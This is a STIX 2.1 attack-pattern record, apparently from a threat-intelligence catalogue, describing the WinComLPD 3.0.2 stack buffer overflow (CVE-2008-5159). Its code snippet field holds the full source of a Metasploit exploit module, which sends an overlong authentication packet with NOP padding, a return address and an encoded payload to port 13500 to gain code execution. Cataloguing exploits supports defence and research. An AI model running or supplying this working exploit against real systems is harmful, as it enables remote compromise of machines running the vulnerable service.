{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8c2a6170-5346-46c1-9424-76c0bcee52de",
    "created": "2024-08-14T16:56:00.920123Z",
    "modified": "2024-08-14T16:56:00.920127Z",
    "name": "WinComLPD Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in WinComLPD <= 3.0.2. By sending an overly long authentication packet to the remote administration service, an attacker may be able to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/lpd/wincomlpd_admin.rb",
            "external_id": "wincomlpd_admin.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-5159"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WinComLPD Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in WinComLPD <= 3.0.2.\n        By sending an overly long authentication packet to the remote\n        administration service, an attacker may be able to execute arbitrary\n        code.\n      },\n      'Author'         => 'MC',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2008-5159'],\n          ['OSVDB', '42861'],\n          ['BID', '27614'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 600,\n          'BadChars' => \"\\x00\\x0a\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'WinComLPD 3.0.2.623',   { 'Ret' => 0x0047d7a7 } ],\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2008-02-04',\n      'DefaultTarget'  => 0))\n\n    register_options([Opt::RPORT(13500)], self)\n  end\n\n  def exploit\n    connect\n\n    # 'net start lpdservice' after you migrate!\n    sploit =  \"\\x65\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\xFF\\x1F\"\n    sploit << make_nops(872 - payload.encoded.length)\n    sploit << payload.encoded + Rex::Arch::X86.jmp_short(6)\n    sploit << make_nops(2) + [target.ret].pack('V') + make_nops(8)\n    sploit << [0xe8, -550].pack('CV') + rand_text_alpha(rand(324) + 1)\n\n    print_status(\"Trying target #{target.name}...\")\n\n    sock.puts(sploit)\n    select(nil,nil,nil,5)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-02-04",
    "x_mitre_platforms": [
        "win'"
    ]
}